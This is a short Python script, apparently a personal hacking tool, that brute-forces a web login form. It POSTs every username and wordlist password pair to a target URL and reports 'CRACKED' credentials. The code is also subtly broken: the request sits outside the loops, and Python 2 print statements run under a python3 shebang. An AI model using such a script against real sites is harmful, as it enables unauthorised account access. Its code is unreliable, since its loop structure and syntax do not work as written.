#!/usr/bin/python3
# -*- coding: utf-8 -*-
# author: Leandro Batista
# e-mail: leandrobatistapereira98@gmail.com

from colorama import Fore, init
import requests
import sys
init(autoreset=True)

url = sys.argv[1]
lista_user = sys.argv[2]
wordlist = sys.argv[3]
lista = open(lista_user, 'r').readlines()
word = open(wordlist, 'r').readlines()

for users in lista:
    users = users.rstrip()
    for passwd in word:
        passwd = passwd.rstrip()
dados = {'username': users, 'password': passwd}
r = requests.post(url, data=dados, allow_redirects=True)
if "Login failed" in r.text:
    print Fore.BLUE + "TESTANDO..."

    print Fore.RED + "Usuario: %s\nSenha: %s" % (users, passwd)
else:
    print Fore.YELLOW + "\O/ BAZINGA \O/\n"

    print Fore.GREEN + "[+]CRACKED: %s %s" % (users, passwd)
